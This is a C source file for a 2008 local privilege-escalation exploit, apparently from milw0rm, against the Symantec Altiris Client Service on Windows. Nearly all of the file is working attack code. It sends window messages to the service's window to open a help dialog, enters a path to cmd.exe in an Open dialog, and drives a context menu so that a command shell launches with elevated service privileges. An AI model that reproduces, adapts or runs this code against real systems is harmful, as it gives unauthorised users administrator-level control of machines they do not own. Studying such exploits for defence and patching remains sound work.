// 0day PRIVATE NOT DISTRIBUTE!!!
//
// Symantec Altiris Client Service Local Exploit (0day) 
//
// Affected Versions	: Altiris Client 6.5.248
//			  Altiris Client 6.5.299
//			  Altiris client 6.8.378
//
// Alex Hernandez aka alt3kx 
// ahernandez [at] sybsecurity.com
//
// Eduardo Vela aka sirdarckcat 
// sirdarckcat [at] gmail.com
//
// We'll see you soon at ph-neutral 0x7d8

#include "stdio.h"
#include "windows.h"

int main(int argc, char* argv[])
{
 HWND lHandle, lHandle2;
 POINT point;
 int id,a=0;
 char langH[255][255];
 char langO[255][255];
 char wname[]="Altiris Client Service";
 
 strcpy(langH[0x0c],"Aide de Windows");
 strcpy(langH[0x09],"Windows Help");
 strcpy(langH[0x0a],"Ayuda de Windows");
 
 strcpy(langO[0x0c],"Ouvrir");
 strcpy(langO[0x09],"Open");
 strcpy(langO[0x0a],"Abrir");
 
 printf("##########################################################\n");
 printf("#                  Altiris Client Service                #\n");
 printf("# WM_COMMANDHELP Windows Privilege Escalation Exploit    #\n");
 printf("# by sirdarckcat & alt3kx                                #\n");
 printf("#                                                        #\n");
 printf("# This exploit is based on www.milw0rm.com/exploits/350  #\n");
 printf("# Utility Manager Privilege Elevation Exploit (MS04-019) #\n");
 printf("# by Cesar Cerrudo                                       #\n");
 printf("##########################################################\n\n");
  
 id=PRIMARYLANGID(GetSystemDefaultLangID());
 if (id==0 && (id=PRIMARYLANGID(GetUserDefaultLangID()))){
    printf("Lang not found, using english\n");
    id=9;
 }

 char sText[]="%windir%\\system32\\cmd.ex?";

 if (argc<2){
    printf("Use:\n> %s [LANG-ID]\n\n",argv[0]);
    printf("Look for your LANG-ID here:\n");
    printf("http://msdn2.microsoft.com/en-us/library/ms776294.aspx\n");
    printf("\nAnyway, the program will try to guess it.\n\n");
    return 0;
 }else{
    if (argc==2){
       if (langH[atoi(argv[1])]){
          id=atoi(argv[1]);
          printf("Lang changed\n");
       }else{
          printf("Lang not supported\n",id);
       }
    }
 }
 printf("Using Lang %d\n",id);
 printf("Looking for %s..\n",wname);
 lHandle=FindWindow(NULL, wname);   
 if (!lHandle) {
  printf("Window %s not found\n", wname);
  return 0;
 }else{
  printf("Found! exploiting..\n");
 }
 PostMessage(lHandle,0x313,NULL,NULL);
 
 Sleep(100);

 SendMessage(lHandle,0x365,NULL,0x1);
 Sleep(300);
 pp:
 if (!FindWindow(NULL, langH[id])){
    printf("Help Window not found.. exploit unsuccesful\n");
    if (id!=9){
       printf("Trying with english..\n");
       id=9;
       goto pp;
    }else{
          return 0;
    } 
 }else{
    printf("Help Window found! exploiting..\n");
 } 
 SendMessage (FindWindow(NULL, langH[id]), WM_IME_KEYDOWN, VK_RETURN, 0);
 Sleep(500);
 lHandle = FindWindow("#32770",langO[id]);
 lHandle2 = GetDlgItem(lHandle, 0x47C);
 Sleep(500);
 printf("Sending path..\n");
 SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)sText);
 Sleep(800);
 SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);
 lHandle2 = GetDlgItem(lHandle, 0x4A0);
 printf("Looking for cmd..\n"); 
 SendMessage (lHandle2, WM_IME_KEYDOWN, VK_TAB, 0);
 Sleep(500);
 lHandle2 = FindWindowEx(lHandle,NULL,"SHELLDLL_DefView", NULL);
 lHandle2 = GetDlgItem(lHandle2, 0x1);
 printf("Sending keys..\n");
 SendMessage (lHandle2, WM_IME_KEYDOWN, 0x43, 0);
 SendMessage (lHandle2, WM_IME_KEYDOWN, 0x4D, 0);
 SendMessage (lHandle2, WM_IME_KEYDOWN, 0x44, 0);
 Sleep(500);
 mark:
 PostMessage (lHandle2, WM_CONTEXTMENU, 0, 0);
 Sleep(1000);
 point.x =10; point.y =30;
 lHandle2=WindowFromPoint(point);
  Sleep(1000);
 printf("Opening shell..\n");
 SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0);
  Sleep(1000);
 SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0);
  Sleep(1000);
 SendMessage (lHandle2, WM_KEYDOWN, VK_RETURN, 0);
  Sleep(1000);
 if (!FindWindow(NULL,"C:\\WINDOWS\\system32\\cmd.exe") && !FindWindow(NULL,"C:\\WINNT\\system32\\cmd.exe")){
    printf("Failed\n");
    if (!a){
        a++;
        goto mark;
    }
 }else{
       printf("Done!\n");
 }
 if(!a){
    SendMessage (lHandle, WM_CLOSE,0,0);
    Sleep(500);
    SendMessage (FindWindow(NULL, langH[id]), WM_CLOSE, 0, 0);
    SendMessage (FindWindow(NULL, argv[1]), WM_CLOSE, 0, 0);
 }else{
    printf("The exploit failed, but maybe the context window of the shell is visibile.\n");
 }
 return 0;
}

// milw0rm.com [2008-05-15]
